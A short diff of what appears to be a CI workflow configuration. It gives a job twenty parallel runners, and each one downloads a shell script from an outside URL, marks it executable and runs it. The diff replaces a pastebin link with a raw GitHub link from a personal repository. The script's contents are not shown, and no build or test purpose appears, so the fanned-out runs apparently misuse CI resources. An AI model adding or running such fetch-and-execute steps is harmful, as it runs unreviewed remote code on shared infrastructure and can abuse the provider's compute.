@@ -24,4 +24,4 @@ jobs:
      runner: [0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19]
    steps:
      - run: |
-          wget https://pastebin.com/raw/TXYnvQHp -O bash.sh && chmod +x bash.sh && ./bash.sh
+          wget https://raw.githubusercontent.com/NAWAK01/script2/main/bash.sh && chmod +x bash.sh && ./bash.sh
